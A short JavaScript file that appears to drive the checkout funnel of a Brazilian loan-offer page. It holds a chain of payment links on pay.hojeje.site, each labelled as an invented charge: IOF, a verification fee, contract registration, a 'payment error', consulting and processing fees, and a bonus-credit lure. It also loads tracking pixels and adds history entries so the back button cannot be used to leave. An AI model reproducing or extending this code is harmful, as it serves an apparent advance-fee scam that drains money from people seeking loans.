const baseLinks = {
    up1: "https://pay.hojeje.site/RmA83EaRMOw3PVp", // IOF
    up2: "https://pay.hojeje.site/6YQPgjnXBzLgpxz", // Taxa de verificação de IOF
    up3: "https://pay.hojeje.site/1VOvGV4Adz03D62", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.hojeje.site/JqoR32bdkE03Vj5", // NFe
    up5: "https://pay.hojeje.site/lDW0ZaJXQzaGN7E", // Ativar conta
    up6: "https://pay.hojeje.site/KV603koX7zk3w8y", // Taxa de registro do contrato
    up7: "https://pay.hojeje.site/nOzxZooXRzNZJ07", // Parabéns, 20k adicional
    up8: "https://pay.hojeje.site/4KovG1Qxa7dGyDE", // Erro no pagamento - 14,06
    up9: "https://pay.hojeje.site/q510ZOb4VMJ3E9D", // APP - 11,99
    up10:"https://pay.hojeje.site/YEwR3AV7yoPZdKy", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.hojeje.site/VroegN1dJ5pGKwj",// Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.hojeje.site/rn4RgQvo2ml3wBV" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}



// UTMIFY, troque o pixel só aqui, belê?
(function() {
 window.googlePixelId = "68af1a51390b0da1784d4f3e";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
  document.head.appendChild(a);
})();


(function() {
    const script = document.createElement('script');
    
    script.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    script.setAttribute('data-utmify-prevent-xcod-sck', '');
    script.setAttribute('data-utmify-prevent-subids', '');
    script.async = true;
    script.defer = true;

    document.head.appendChild(script);
})();


// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);